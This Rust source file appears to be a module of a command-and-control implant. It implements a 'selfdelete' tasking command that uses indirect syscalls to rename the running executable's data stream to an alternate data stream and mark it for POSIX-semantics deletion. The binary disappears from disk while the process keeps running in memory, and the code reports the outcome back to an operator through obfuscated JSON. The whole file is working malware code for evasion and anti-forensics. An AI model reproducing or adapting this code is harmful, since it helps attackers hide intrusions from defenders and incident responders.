use crate::transport;
use callghost::syscall;
use obfstr::obfstr;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::mem;
use std::ptr;

use winapi::um::libloaderapi::GetModuleFileNameW;
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::processthreadsapi::GetCurrentProcessId;

const MAX_PATH_LEN: usize = 260;

// ACCESS_MASK
const DELETE: u32 = 0x0001_0000;
const SYNCHRONIZE: u32 = 0x0010_0000;

// Share access
const FILE_SHARE_READ: u32 = 0x1;
const FILE_SHARE_WRITE: u32 = 0x2;
const FILE_SHARE_DELETE: u32 = 0x4;

// Create disposition / options
const FILE_OPEN: u32 = 0x0000_0001;
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;

// FILE_INFORMATION_CLASS
const FileRenameInformation: u32 = 10;
const FileDispositionInformationEx: u32 = 64;

// FILE_DISPOSITION_INFORMATION_EX flags
const FILE_DISPOSITION_FLAG_DELETE: u32 = 0x1;
const FILE_DISPOSITION_FLAG_POSIX_SEMANTICS: u32 = 0x2;

const OBJ_CASE_INSENSITIVE: u32 = 0x40;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut core::ffi::c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut core::ffi::c_void,
    security_quality_of_service: *mut core::ffi::c_void,
}

#[repr(C)]
struct IoStatusBlock {
    status: i64, // NTSTATUS or pointer; 8 bytes on x64
    information: usize,
}

/// FILE_RENAME_INFORMATION layout (x64): BOOLEAN + pad → HANDLE at offset 8.
#[repr(C)]
struct FileRenameInformation {
    replace_if_exists: u32, // DWORD Flags / BOOLEAN — RootDirectory still at off 8
    root_directory: usize,
    file_name_length: u32,
    file_name: [u16; MAX_PATH_LEN],
}

#[repr(C)]
struct FileDispositionInformationEx {
    flags: u32,
}

/// Convert a DOS path (e.g. `C:\foo.exe`) to an NT path (`\??\C:\foo.exe`).
fn dos_to_nt_path(path: &[u16]) -> Vec<u16> {
    let mut nt: Vec<u16> = Vec::with_capacity(path.len() + 4);
    // \??\
    nt.extend_from_slice(&[0x005C, 0x003F, 0x003F, 0x005C]);
    // strip trailing null from source if present
    let end = path.iter().position(|&c| c == 0).unwrap_or(path.len());
    nt.extend_from_slice(&path[..end]);
    nt.push(0);
    nt
}

unsafe fn nt_open_file(nt_path: &mut [u16]) -> Option<*mut core::ffi::c_void> {
    let mut unicode = UnicodeString {
        length: ((nt_path.len() - 1) * 2) as u16,
        maximum_length: (nt_path.len() * 2) as u16,
        buffer: nt_path.as_mut_ptr(),
    };

    let mut oa = ObjectAttributes {
        length: mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null_mut(),
        object_name: &mut unicode,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };

    let mut iosb: IoStatusBlock = mem::zeroed();
    let mut handle: *mut core::ffi::c_void = ptr::null_mut();

    let status = syscall!(
        indirect,
        NtCreateFile,
        &mut handle,
        DELETE | SYNCHRONIZE,
        &mut oa as *mut _ as *mut u8,
        &mut iosb as *mut _ as *mut u8,
        ptr::null_mut::<i64>(),
        0u32, // FileAttributes
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ptr::null_mut::<u8>(),
        0u32
    );

    if status == 0 && !handle.is_null() {
        Some(handle)
    } else {
        None
    }
}

unsafe fn nt_set_file_info(
    handle: *mut core::ffi::c_void,
    info_class: u32,
    info: *mut u8,
    length: u32,
) -> bool {
    let mut iosb: IoStatusBlock = mem::zeroed();
    let status = syscall!(
        indirect,
        NtSetInformationFile,
        handle,
        &mut iosb as *mut _ as *mut u8,
        info,
        length,
        info_class
    );
    status == 0
}

fn delete_self_from_disk() -> bool {
    unsafe {
        // Get own executable path
        let mut path_buf = [0u16; MAX_PATH_LEN * 2];
        let len = GetModuleFileNameW(
            ptr::null_mut(),
            path_buf.as_mut_ptr(),
            (MAX_PATH_LEN * 2) as u32,
        );
        if len == 0 {
            return false;
        }

        let mut nt_path = dos_to_nt_path(&path_buf[..len as usize]);

        // Build random ADS name using tick count and PID
        let tick = GetTickCount();
        let pid = GetCurrentProcessId();
        let stream_name = format!(":{:x}{:x}", tick, pid);
        let stream_wide: Vec<u16> = OsStr::new(&stream_name)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        // Prepare FILE_RENAME_INFORMATION
        let mut rename_info: FileRenameInformation = mem::zeroed();
        rename_info.replace_if_exists = 0;
        rename_info.root_directory = 0;
        rename_info.file_name_length = ((stream_wide.len() - 1) * 2) as u32;
        let copy_len = stream_wide.len().min(MAX_PATH_LEN);
        ptr::copy_nonoverlapping(
            stream_wide.as_ptr(),
            rename_info.file_name.as_mut_ptr(),
            copy_len,
        );

        // Step 1: Open file with DELETE access
        let handle = match nt_open_file(&mut nt_path) {
            Some(h) => h,
            None => return false,
        };

        // Step 2: Rename the default data stream to an alternate data stream.
        // Length = fixed header (ReplaceIfExists + RootDirectory + FileNameLength) + name bytes.
        let rename_info_len =
            (mem::offset_of!(FileRenameInformation, file_name) + rename_info.file_name_length as usize)
                as u32;
        let ok = nt_set_file_info(
            handle,
            FileRenameInformation,
            &mut rename_info as *mut _ as *mut u8,
            rename_info_len,
        );
        crate::nt_mem::close_handle(handle);
        if !ok {
            return false;
        }

        // Step 3: Reopen the file (now with renamed stream)
        let handle = match nt_open_file(&mut nt_path) {
            Some(h) => h,
            None => return false,
        };

        // Step 4: Mark for deletion with POSIX semantics
        let mut disposal_info = FileDispositionInformationEx {
            flags: FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS,
        };
        let ok = nt_set_file_info(
            handle,
            FileDispositionInformationEx,
            &mut disposal_info as *mut _ as *mut u8,
            mem::size_of::<FileDispositionInformationEx>() as u32,
        );
        crate::nt_mem::close_handle(handle);

        ok
    }
}

pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").unwrap().as_str().unwrap();
    let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();

    crate::helpers::churn(id);

    let success = delete_self_from_disk();

    let output = if success {
        "Self-delete successful. Binary removed from disk, process continues running in memory."
    } else {
        "Self-delete failed."
    };

    let status = if success { "success" } else { "error" };
    let response_json = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [
            {
                obfstr!("task_id"): id,
                obfstr!("user_output"): output,
                obfstr!("timestamp"): timestamp,
                obfstr!("status"): status,
                obfstr!("completed"): true,
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    transport::send_request(&response_value)?;

    Ok(())
}
